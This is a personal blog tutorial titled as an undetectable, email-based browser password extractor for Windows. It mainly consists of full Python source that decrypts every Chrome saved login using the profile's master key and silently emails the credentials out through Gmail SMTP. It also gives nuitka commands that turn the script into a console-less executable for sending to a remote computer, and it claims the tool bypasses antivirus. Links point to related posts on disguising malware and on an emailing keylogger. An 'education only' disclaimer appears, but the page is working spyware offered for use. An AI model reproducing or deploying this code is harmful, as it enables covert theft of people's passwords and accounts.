<!doctype html>
<html lang="en">

<head>
    <title>A Browser Password Extractor - Email</title>
    <meta charset="UTF-8">
    <meta name="description"
        content="A Browser Password Extractor will send all the saved data from a browser and send it to an email address without letting the user know.">
    <meta name="keywords"
        content="personal, blog, education, browser hacking, password stealing, browser saved password stealing, password hacking">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" sizes="192x192" href="../images/favicon-192x192.png">

    <!-- Stylesheets -->
    <link rel="stylesheet" href="../css/bootstrap.css" />
    <link rel="stylesheet" href="../css/reset.css" />
    <link rel="stylesheet" href="../css/style.css" />
    <link rel="stylesheet" href="../css/animate.css" />
    <link rel="stylesheet" href="../css/magnific-popup.css" />
    <link rel="stylesheet" href="../css/prism.css">

    <!-- Google Web fonts -->
    <link
        href="https://fonts.googleapis.com/css2?family=Fira+Sans+Extra+Condensed:wght@300&family=Oswald:wght@300&display=swap"
        rel="stylesheet">

    <!-- Font icons -->
    <link rel="stylesheet" href="../icon-fonts/font-awesome-4.5.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="../icon-fonts/essential-regular-fonts/essential-icons.css" />

    <!-- Fork Awesome -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
        integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">

    <!-- jQuery library -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</head>

<body class="diag" id="diag">
    <nav class="subpage-nav">
        <div class="row">
            <div class="container">
                <div class="logo">
                    <img src="../images/logo.png" alt="">
                </div>
                <div class="responsive"><i data-icon="m" class="icon"></i></div>
                <ul class="nav-menu">
                    <li><a href="fortyseven-homepage-complete-list-of-blogs.html">Home</a></li>
                    <li><a href="about.html">About</a></li>
                    <li><a href="contact.html">Contact</a></li>
                    <li><a href="../index.html">Portfolio</a></li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container content">
        <div class="row">
            <div class="col-md-1"></div>
            <div class="blog-single col-md-10">
                <div class="blog-image">
                    <img src="images/browser-extractor-email/bpe-head.png" alt="">
                </div>
                <h1>Email Based, a Browser Password Extractor for Windows using Python. (Undetectable)</h1>
                <div class="blog-detail">Posted <span>23 May 2021</span> by Pushkar Jadhao</div>

                <div class="blog-content redirect-bq">
                    <div id="intro">
                        <h2>Introduction: </h2>
                        <p style="color:#fff;">A Spyware is a type of software that infiltrates a computing device to
                            stealing
                            sensitive information often without any knowledge to the user.</p>
                    </div>

                    <div id="working" class="inblog-a">
                        <h2>Therotical Working: </h2>
                        <p>The Browser Pasaword Extractor will extract every single saved credential from a target
                            browser and will
                            send it to an email address.</p><br>
                        <p>This tool will bypass most of the <a href="images/browser-extractor-email/bpe-email.png"
                                class="link">antiviruse<img src="" alt=""></a> making it undetectable and look
                            less suspecious.</p><br>
                        <p>Here’s how the the blog will take you through --- We’ll be creating a Python script to which
                            we’ll be
                            converting it into a Windows executable (.exe) so that it can be sent to a remote computer.
                        </p><br>

                        <blockquote class="redirect-bq">
                            <a
                                href="scan-a-malware-through-a-list-of-antiviruses-for-free-without-distributing-the-results.html">If
                                you want to know how
                                to scan any file throughout a list of antiviruses without distributing the results,
                                please go through this blog.</a>
                        </blockquote>
                    </div>

                    <div id="requirements">
                        <h2>Requirements: </h2>
                        <ul class="list-style">
                            <li>Windows 10 64Bit</li>
                            <li>Pycharm IDE</li>
                            <li>Python 2.7</li>
                        </ul>
                    </div>
<!-- 
                    <div id="program-in-action">
                        <h2>Program in Action: </h2>
                        <p>Below is the demo of the final program in action.</p>
                    </div>
                    <div class="video-responsive">
                        <iframe height="500" src="https://www.youtube.com/embed/8CrVeTKXLVc" frameborder="0"
                            allow="accelerometer; encrypted-media; gyroscope; picture-in-picture"
                            allowfullscreen></iframe>
                    </div> -->

                    <blockquote>
                        Disclaimer: The blog is meant for EDUCATION PURPOSE ONLY. I've used my own systems to carry out
                        the tests. I
                        personally DO NOT support or promote any unethical practices, as said, it is solely meant for
                        education
                        purpose. Any misuse of the available content is completely at your own risks.
                    </blockquote>

                    <div id="libraries-used">
                        <h2>Libraries Used: </h2>
                        <p>We'll be using a bunch of libraries out of which most of them will be preinstalled. I'm sure
                            you'll face some issues related to libraries not being located. <a
                                href="images/browser-extractor-email/browser-extractor-email.png" class="link">Click
                                here and
                                check my list of libraries, in case you face any issues, try to install the same version
                                as mine.<img src="" alt=""></a></p><br>
                        <ul class="list-style">
                            <li><b style="color:#e0e0e0">smtplib : </b> Defines an SMTP client session that can be used
                                to send mails.
                            </li>
                            <li><b style="color:#e0e0e0">subprocess : </b> Allows you to spawn new processes, connect to
                                their I/O,
                                error pipes, and obtain their return codes.</li>
                            <li><b style="color:#e0e0e0">os : </b> The module provides functions for interacting with
                                the operating
                                system.</li>
                            <li><b style="color:#e0e0e0">Pywin32 : </b> Python extensions for Microsoft Windows Provides
                                access to much of the Win32 API, the ability to create and use COM objects, and the
                                Pythonwin environment.</li>
                            <li><b style="color:#e0e0e0">PyCryptodome : </b> It is a self-contained Python package of
                                low-level cryptographic primitives.</li>
                            <li><b style="color:#e0e0e0">SQLite3 : </b> It provides an SQL interface compliant with the
                                DB-API 2.0 specification described by PEP 249.</li>
                        </ul>
                    </div>


                    <pre><code class="language-py">
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import smtplib
import subprocess
import sys

# your gmail credentials
email = "your_gmail_address"
password = "gmail_password"


def get_master_key():
    # open the file called Local State to get the master key
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        # load the file as json
        local_state = json.loads(local_state)
        # decode the available base64 data 
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        # return the final master key
        return master_key

# passsing the cipher to decrypt the payload
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# generating a cipher for the obtained iv with the help of the master_key
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


# decrypt password one by one with the help of master key
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15] # only characters between 3-15 are required
        payload = buff[15:] # remove prefix
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        # returning the decrypted password
        return decrypted_pass
    except Exception as e:
        # if we're unable to decrypt the password, it is because the version is unsupproted
        return "Unsupproted Chrome Version"


# function to send an email
def send_mail(email, password, message):
    # gmail SMTP connection
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # tell the server that a connection is being made
    server.starttls()
    # login to the email account
    server.login(email, password)
    # sending email from your email address to your own email address along with the message
    server.sendmail(email, email, message)
    # quit the session after sending a message
    server.quit()


# consists the final message that is to be sent via email
total_log = "----Browser Password Extractor By f0rty5ev3n----\n\n"

# getting the returned master key by calling the function get_master_key
master_key = get_master_key()

# actual Login DB location for Chrome
# for Microsoft Edge, use AppData\Local\Microsoft\Edge\User Data\Default\Login Data
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'

# making a temp copy since Login Data DB is locked while Chrome is running
shutil.copy2(login_db, "Loginvault.db") 

# connecting to the copied DB
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
try:
    # getting url, username and password from the Login DB with the help of sqlite3
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    for r in cursor.fetchall():
        # define url as a row 0 of the DB
        url = r[0]

        # define username as a row 1 of the DB
        username = r[1]

        # define encrypted_password as a row 2 of the DB
        encrypted_password = r[2]

        # passing the encrypted password to previously defined decrypt_password function and getting the returned final password
        decrypted_password = decrypt_password(encrypted_password, master_key)

        # if DB containes more than 0 usernames, then append it to total_log one by one
        if len(username) > 0:
            log = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")

            # adding each credential as a string to the total_log one by one without replacing the current available data in total_log
            total_log = total_log + str(log)

except Exception as e:
    pass

# leave the cursor and close the DB connection safely
cursor.close()
conn.close()
try:
    # try deleting the temp database at the end
    os.remove("Loginvault.db")
except Exception as e:
    pass

# now that we have all the passwords decrypted in the total_log, we'll call the send_mail function and pass the total_log as a message
send_mail(email, password, "\n\n" + total_log)

</code></pre>

                    <div class="pytoexe">
                        <h2>Converting to .EXE: </h2>
                        <p>There are several methods to convert a python program to a Windows executable.</p>
                        <!-- <p><a href="">If the below method dosen't work for you, click here to know the other methods.</a></p></br> --></br>
                        <p>We'll be using <a href="https://nuitka.net/" target="_blank">nuitka</a> to convert a python
                            program to a Windows executable.</p>
                        <p>In your project directory, run the below command to install nuitka.</p>
                        <pre><code class="language-py">pip install nuitka</code></pre>
                        <p>Once installed, let's compile our program.</p>
                        <pre><code class="language-python">nuitka --windows-disable-console --standalone program_name.py</code></pre>
                    </div>
                    <p>If you're running this command for the first time, it will download a bunch of libraries ~500Mbs.
                        Once it's done, you'll see two folders in your project directory <span
                            style="color: #e0e0e0;">'program_name.build'</span> and <span
                            style="color: #e0e0e0;">'program_name.dist'</span>.</p></br>

                    <p>The <span style="color: #e0e0e0;">'program_name.dist'</span> is the folder containing your final
                        Windows executable.</p></br>

                    <p>Now that you've the final program running, you'll just have to bind them togather into a single
                        file. <a href="masking-a-malware-to-look-like-any-other-media-file.html">You can simply follow
                            this process for binding your file.</a></p>

                    <div class="social-share">
                        <h4>SHARE</h4>
                        <a href="https://www.facebook.com/sharer/sharer.php?u=https://fortysev-en.github.io/blogs/browser-password-extractor-to-email-address.html"
                            target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
                        <a href="https://twitter.com/share?url=https://fortysev-en.github.io/blogs/browser-password-extractor-to-email-address.html"
                            target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
                    </div>

                    <div class="download">
                        <h4>DOWNLOADS</h4>
                        <a href="https://github.com/fortysev-en/chrome_pwd_extractor_email" target="_blank"><i
                                class="fa fa-github" aria-hidden="true"></i></a>
                    </div>
                </div>
            </div>
            <div class="col-md-1"></div>
        </div>

        <div class="suggestions-row">
            <div class="row recent-blogs-border">
                <div class="col-lg-5 col-md-5 col-sm-4 col-xs-3 left-border"></div>
                <div class="col-lg-2 col-md-2 col-sm-4 col-xs-6 center-text">Blogs You May Like</div>
                <div class="col-lg-5 col-md-5 col-sm-4 col-xs-3 right-border"></div>
            </div>
            <div class="col-lg-4 col-md-4 sm-12 xs-12 blog-content blog-content-hovereffect"><a
                    href="masking-a-malware-to-look-like-any-other-media-file.html">
                    <div class="blog-image">
                        <img src="images/masker/filemasker.jpg">
                    </div>
                    <h2 class="blog-title">Mask a malware (.exe) to look like and behave like any other file (pdf, txt,
                        doc..)</h2>
                    <p>A technique to mask any malware to any other file which will also inherit it's properties to look
                        less suspicious.</p>
                </a></div>

            <div class="col-lg-4 col-md-4 sm-12 xs-12 blog-content blog-content-hovereffect"><a
                    href="scan-a-malware-through-a-list-of-antiviruses-for-free-without-distributing-the-results.html">
                    <div class="blog-image">
                        <img src="images/antiscan/antivirus.jpg">
                    </div>
                    <h2 class="blog-title">AntiScan - Scan a Malware through multiple antiviruses without distributing
                        the
                        result</h2>
                    <p>Scanning a malware through a list of antiviruses is as important as
                        developing a malware as it will actually work only if it is not detected by any Anti Virus.</p>
                </a>
            </div>

            <div class="col-lg-4 col-md-4 sm-12 xs-12 blog-content blog-content-hovereffect">
                <a href="a-pdf-looking-keylogger-for-windows-2020.html">
                    <div class="blog-image">
                        <img src="../images/keylogger.jpg">
                    </div>
                    <h2 class="blog-title">Create your own email sending Keylogger with Python</h2>
                    <p>A Windows PDF looking Keylogger with .pdf extension and which autostarts with system boot,
                        logging
                        every key and sending it to the specified email address.</p>
                </a>
            </div>
        </div>
    </div>

    <center>
        <a class="home-up bounce" href="#diag"><i class="fa fa-angle-up"></i></a>
    </center>
    <footer>
        <div class="container">
            <div class="social">
                <a href="https://www.facebook.com/pushkaraj.jadhao">facebook </a>
                <a href="https://twitter.com/fortysev_en">twitter </a>
                <a href="https://www.youtube.com/channel/UC1Be-Dq7exfnilNhNPgWCew/featured">youtube </a>
                <a href="https://github.com/fortysev-en">github </a>
                <a href="https://codepen.io/fortysev-en">codepen</a>
                <a href="https://www.linkedin.com/in/pushkar-jadhav-511505207">linkedin </a>
            </div>
            <!-- <div id="payment-options" class="footer-payment-options">
                <p class="btc"><i class="fa fa-btc" aria-hidden="true"></i><a>17FhPFfDExrh3JNWhQJgTesE8NGphJH8ci</a></p>
                <p class="ethereum"><i class="fa fa-ethereum"
                        aria-hidden="true"></i><a>0x6e6a5aad65fa35638f5f65dba0fa34d5e13490d0</a></p>
            </div>
            <br> -->
            <p>Copyright © 2021 Pushkar Jadhao, All rights Reserved.</p>
            <center>
                <div class="footer-text">
                    <a href="../index.html">fortyseven</a><br>
                    <a id="counter-browser-password" class="visit-counter" data-toggle="tooltip" data-placement="right"
                        title="Total Visits"></a>
                    <!-- <script>$(document).ready(function () { updateBrowserPasswordExtractor(); });</script> -->
                </div>
            </center>
        </div>
    </footer>

    <!-- Javascripts -->
    <script src="../js/counter.js"></script>
    <script src="../js/prism.js"></script>
    <script src="../js/jquery-2.1.4.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/wow.min.js"></script>
    <script src="../js/isotope.pkgd.min.js"></script>
    <script src="../js/typed.js"></script>
    <script src="../js/jquery.magnific-popup.min.js"></script>
    <script src="../js/main.js"></script>
</body>

</html>